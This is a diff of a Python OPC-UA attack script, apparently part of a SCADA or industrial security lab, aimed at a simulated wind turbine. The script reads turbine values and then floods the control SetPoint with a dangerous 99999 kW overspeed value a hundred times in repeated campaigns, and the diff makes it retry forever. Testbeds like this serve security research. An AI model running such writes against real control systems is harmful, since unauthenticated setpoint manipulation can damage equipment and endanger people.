@@ -28,17 +28,21 @@ def push_metric(action, field_name, value):
 
 async def run_opcua_attacker():
     url = "opc.tcp://opcua-server:4840/freeopcua/server/"
+    uri = "http://scada.hcmut.edu.vn"
     
-    retries = 0
-    while retries < 20:
+    # Chờ server khởi động
+    await asyncio.sleep(5)
+    
+    while True:
         try:
-            async with Client(url=url) as client:
-                print(f"[Attacker] Connected to OPC-UA Server at {url}")
-                
-                uri = "http://scada.hcmut.edu.vn"
+            client = Client(url=url)
+            await client.connect()
+            print(f"Kết nối thành công đến OPC-UA Server! (Attacker)")
+            
+            try:
                 idx = await client.get_namespace_index(uri)
                 
-                # Get nodes for reconnaissance and attack
+                # Get nodes
                 wind_speed_node = await client.nodes.root.get_child(
                     ["0:Objects", f"{idx}:Turbine", f"{idx}:WindSpeed"]
                 )
@@ -46,59 +50,49 @@ async def run_opcua_attacker():
                     ["0:Objects", f"{idx}:Turbine", f"{idx}:Control", f"{idx}:SetPoint"]
                 )
                 
-                while True:
-                    print("\n--- START ATTACK CAMPAIGN ---")
-                    
-                    # Phase 1: Reconnaissance - read current values
-                    print("[PHASE 1] Reconnaissance: reading turbine data...")
+                print("\n--- BẮT ĐẦU CHIẾN DỊCH TẤN CÔNG ---")
+                
+                # Phase 1: Reconnaissance
+                print("[PHASE 1] Quét dữ liệu Turbine...")
+                wind_speed = await wind_speed_node.read_value()
+                setpoint = await setpoint_node.read_value()
+                print(f" [+] Tốc độ gió: {wind_speed}")
+                print(f" [+] SetPoint hiện tại: {setpoint}")
+                push_metric("attack_recon", "wind_speed", wind_speed)
+                push_metric("attack_recon", "setpoint", setpoint)
+                
+                await asyncio.sleep(2)
+                
+                # Phase 2: DoS Attack
+                print("\n[PHASE 2] Tấn công DoS: Ghi SetPoint nguy hiểm (99999 kW) lặp 100 lần...")
+                success_count = 0
+                malicious_setpoint = 99999.0
+                
+                for i in range(100):
                     try:
-                        wind_speed = await wind_speed_node.read_value()
-                        setpoint = await setpoint_node.read_value()
-                        print(f" [+] WindSpeed: {wind_speed}")
-                        print(f" [+] SetPoint: {setpoint}")
-                        push_metric("attack_recon", "wind_speed", wind_speed)
-                        push_metric("attack_recon", "setpoint", setpoint)
-                        recon_ok = True
+                        start_time = time.time()
+                        await setpoint_node.write_value(malicious_setpoint)
+                        latency = (time.time() - start_time) * 1000
+                        
+                        push_metric("write", "latency", latency)
+                        push_metric("write", "node_value", malicious_setpoint)
+                        
+                        success_count += 1
+                        await asyncio.sleep(0.05)
                     except Exception as e:
-                        print(f" Recon exception: {e}")
-                        recon_ok = False
-                    
-                    await asyncio.sleep(2)
-                    
-                    # Phase 2: Attack - set dangerous SetPoint value (9999 kW - overspeed)
-                    if recon_ok:
-                        print("\n[PHASE 2] Flood attack: send dangerous SetPoint (99999 kW) 100 times...")
-                        success_count = 0
-                        malicious_setpoint = 99999.0  # Dangerous overspeed value
-                        
-                        for i in range(100):
-                            try:
-                                start_time = time.time()
-                                await setpoint_node.write_value(malicious_setpoint)
-                                latency = (time.time() - start_time) * 1000  # ms
-                                
-                                push_metric("write", "latency", latency)
-                                push_metric("write", "node_value", malicious_setpoint)
-                                
-                                success_count += 1
-                                await asyncio.sleep(0.05)
-                            except Exception as e:
-                                print(f" Write error at attempt {i + 1}: {e}")
-                        
-                        print(f" [+] Phase 2 complete. Successful writes: {success_count}/100")
-                        print("--- END ATTACK CAMPAIGN. WAIT 30 SECONDS ---\n")
-                        await asyncio.sleep(30)
-                    else:
-                        print(" [!] Skipping Phase 2 due to failed reconnaissance.")
-                        print(" [+] Reattempting attack campaign after 15 seconds...\n")
-                        await asyncio.sleep(15)
-                        
+                        print(f" Lỗi ghi ở vòng {i + 1}: {e}")
+                
+                print(f" [+] Giai đoạn 2 hoàn tất. Thành công ghi {success_count}/100 lệnh.")
+                print("--- KẾT THÚC ĐỢT TẤN CÔNG. CHỜ 30 GIÂY ---\n")
+                
+            finally:
+                await client.disconnect()
+            
+            await asyncio.sleep(30)
+            
         except Exception as e:
-            retries += 1
-            print(f"[Attacker] Connection failed: {e}. Retry {retries}/20...")
-            await asyncio.sleep(3)
-    
-    print("[Attacker] Connection timeout. Exiting.")
+            print(f"[Attacker] Lỗi: {e}. Thử lại sau 5 giây...")
+            await asyncio.sleep(5)
 
 
 if __name__ == "__main__":
